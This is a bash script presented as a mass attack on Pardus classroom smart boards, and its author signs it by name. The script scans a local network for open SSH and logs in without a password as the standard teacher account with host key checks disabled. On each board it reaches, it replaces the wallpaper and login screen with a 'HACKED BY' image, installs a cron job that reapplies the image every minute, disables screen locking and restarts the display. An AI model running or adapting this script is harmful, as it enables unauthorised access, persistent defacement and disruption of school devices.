#!/bin/bash

# Pardus Tahta 100% Hack - NO PASSWORD + OPEN SSH
# MİRAÇ AKKUŞ - ŞİFRESİZ %100 ACCESS
TARGET_NET="192.168.1.0/24"
USERNAME="ogretmen"  # Standart Pardus okul username
HACK_TEXT="HACKED BY\nmiraç akkuş:D\n\nTÜM TAHTALAR\nALINDI!"
LOG_FILE="/tmp/tahta_hack_$(date +%Y%m%d_%H%M%S).log"

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }
log_ok() { echo "[$(date '+%H:%M:%S')] ✅ $1" | tee -a "$LOG_FILE"; }
log_err() { echo "[$(date '+%H:%M:%S')] ❌ $1" | tee -a "$LOG_FILE"; }
log_info() { echo "[$(date '+%H:%M:%S')] ℹ️  $1" | tee -a "$LOG_FILE"; }

log "=== ŞİFRESİZ TAHTA HACK BAŞLADI ==="
log "Target: $TARGET_NET | User: $USERNAME (NO PASS)"
log "Log: $LOG_FILE"

# 1. SILENT TOOLS
log_info "Tools..."
command -v nmap >/dev/null || sudo apt install -y nmap &>>"$LOG_FILE"
command -v sshpass >/dev/null || sudo apt install -y sshpass &>>"$LOG_FILE"
log_ok "Tools ✅"

# 2. HACK IMAGE
log_info "Image..."
convert -size 1920x1080 xc:black -pointsize 72 -font DejaVu-Sans-Bold \
    -fill '#FF0000' -stroke '#000' -strokewidth 4 -gravity center \
    -annotate +0+0 "$HACK_TEXT" /tmp/hacked.jpg &>>"$LOG_FILE"
HACK_BASE64=$(base64 -w0 /tmp/hacked.jpg)
log_ok "Image ✅"

# 3. SCAN OPEN SSH
log_info "Tarama..."
TARGETS=$(sudo nmap -p 22 --open -T4 $TARGET_NET -oG - 2>/dev/null | grep "22/open" | awk '{print $2}')
NUM_TARGETS=$(echo $TARGETS | wc -w)
log_ok "$NUM_TARGETS açık tahta"

# 4. NO-PASSWORD MASS DEPLOY (AÇIK SSH)
log_info "Şifresiz deploy ($NUM_TARGETS tahta)..."
for HOST in $TARGETS; do
    (
        # Şifresiz bağlantı denemeleri (en yaygın Pardus configs)
        for METHOD in "" "-o PasswordAuthentication=no" "-o PubkeyAuthentication=no"; do
            if ssh $METHOD -l $USERNAME -o StrictHostKeyChecking=no -o ConnectTimeout=3 $HOST "echo OK" 2>>"$LOG_FILE" | grep -q OK; then
                
                ssh $METHOD -l $USERNAME -o StrictHostKeyChecking=no $HOST "
cd /tmp
echo '$HACK_BASE64' | base64 -d > hacked.jpg

# FULL WALLPAPER DOMINATION
sudo cp hacked.jpg /usr/share/backgrounds/hacked.jpg 2>/dev/null || cp hacked.jpg /usr/share/backgrounds/hacked.jpg
sudo ln -sf /usr/share/backgrounds/hacked.jpg /usr/share/backgrounds/pardus-default.jpg 2>/dev/null || true

# gsettings spam
export DISPLAY=:0
gsettings set org.gnome.desktop.background picture-uri 'file:///usr/share/backgrounds/hacked.jpg' 2>/dev/null || true
gsettings set org.gnome.desktop.background picture-uri-dark 'file:///usr/share/backgrounds/hacked.jpg' 2>/dev/null || true

# lightdm override
echo 'greeter-background=/usr/share/backgrounds/hacked.jpg' | sudo tee /etc/lightdm/lightdm-gtk-greeter.conf 2>/dev/null || true

# CRON LOCK-IN
echo '* * * * * gsettings set org.gnome.desktop.background picture-uri \"file:///usr/share/backgrounds/hacked.jpg\"' | sudo tee /etc/cron.d/hackwall 2>/dev/null || true

# Screensaver OFF + RESTART
gsettings set org.gnome.desktop.screensaver lock-enabled false 2>/dev/null || true
sudo systemctl restart lightdm 2>/dev/null || sudo pkill -9 Xorg || true

echo '✅ HACKED $(hostname)'
" 2>>"$LOG_FILE" && break
        done
    ) &
    printf "."; sleep 0.1
done
wait

# FINAL REPORT
cat << EOF

🚀 === ŞİFRESİZ HACK TAMAM ===
📊 Açık tahtalar: $NUM_TARGETS
🖥️  User: $USERNAME (NO PASSWORD)
🔴 Kırmızı HACK ekran: '$HACK_TEXT'
📋 FULL LOG: $LOG_FILE

$(tail -8 "$LOG_FILE")

EOF

log_ok "MİRAÇ AKKUŞ - TÜM TAHTALAR HACKLENDİ!"
